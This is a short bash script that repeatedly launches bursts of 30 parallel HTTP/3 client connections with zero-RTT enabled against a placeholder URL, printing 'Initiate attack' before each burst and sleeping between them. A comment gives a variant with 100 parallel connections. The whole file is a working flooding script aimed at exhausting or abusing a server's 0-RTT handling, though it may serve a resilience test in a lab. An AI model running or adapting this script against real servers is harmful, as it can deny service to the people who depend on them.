while true
do
   echo "\e[0;31mInitiate attack\e[0m"
   #Or seq 1 100 | timeout 5s xargs -n1 -P100
   sudo seq 1 30 | timeout 1s xargs -n1 -P30 python3 examples/http3_client.py --zero-rtt URL 
   echo "\e[0;32mSleep...\e[0m"
   sleep 30;
done
